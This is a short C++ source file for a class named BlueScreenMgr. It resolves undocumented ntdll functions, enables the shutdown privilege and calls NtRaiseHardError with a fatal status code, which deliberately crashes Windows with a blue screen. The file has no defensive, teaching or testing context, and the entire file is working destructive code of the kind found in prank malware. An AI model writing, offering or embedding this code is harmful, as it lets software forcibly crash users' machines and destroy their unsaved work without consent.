#include "pch.h"
#include "BlueScreenMgr.h"


BlueScreenMgr::BlueScreenMgr()
{
	hDLL = LoadLibrary(TEXT("ntdll.dll"));
	nEn = 0;
	NtRaiseHardError = (NTRAISEHARDERROR)GetProcAddress(hDLL, "NtRaiseHardError");
	RtlAdjustPrivilege = (RTLADJUSTPRIVILEGE)GetProcAddress(hDLL, "RtlAdjustPrivilege");
}

void BlueScreenMgr::StartBlueScreen()
{
	RtlAdjustPrivilege(0x13, TRUE, FALSE, &nEn);//0x13 = SeShutdownPrivilege
	NtRaiseHardError(0xC000021A, 0, 0, 0, OptionShutdownSystem, &reResponse);
}
